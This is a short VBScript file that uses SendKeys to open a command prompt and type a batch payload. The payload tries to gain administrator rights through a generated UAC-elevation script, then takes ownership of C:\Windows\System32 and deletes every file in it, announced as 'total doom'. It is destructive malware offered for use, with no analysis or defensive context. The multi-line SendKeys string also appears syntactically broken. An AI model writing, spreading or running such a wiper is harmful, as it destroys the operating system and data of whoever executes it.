Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.SendKeys "^{ESC}" ' Simulates pressing Ctrl + Esc to open the Start menu
WScript.Sleep 100 ' Wait for a moment to ensure the Start menu opens
WshShell.SendKeys "r" ' Simulates pressing the R key
WScript.Sleep 100

WshShell.SendKeys "{ENTER}" ' Simulates pressing the Enter key
WScript.Sleep 100

WshShell.SendKeys "cmd"                               
WScript.Sleep 200

WshShell.SendKeys "{ENTER}" 
WScript.Sleep 100


WshShell.SendKeys "net session >nul 2>&1
if %errorLevel% == 0 (
    echo Running with administrator privileges
    set "admin=1"
) else (
    echo Not running with administrator privileges. Attempting to elevate...
    set "admin=0"
)

REM If not running with admin privileges, elevate
if "%admin%"=="0" (
    echo Elevating privileges...
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
        echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
        "%temp%\getadmin.vbs"
        del "%temp%\getadmin.vbs"
        exit /B
    )
    echo Successfully elevated privileges!
)

echo Prepare for total doom...
echo.
echo.

REM Take ownership of System32
@echo off
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant administrators:F /t
cd C:\Windows\System32

REM Delete System32
timeout /t 4 NOBREAK > nul
@echo off
del /F /S /Q *.* "

WScript.Sleep 100

WshShell.SendKeys "{ENTER}" 
WScript.Sleep 100


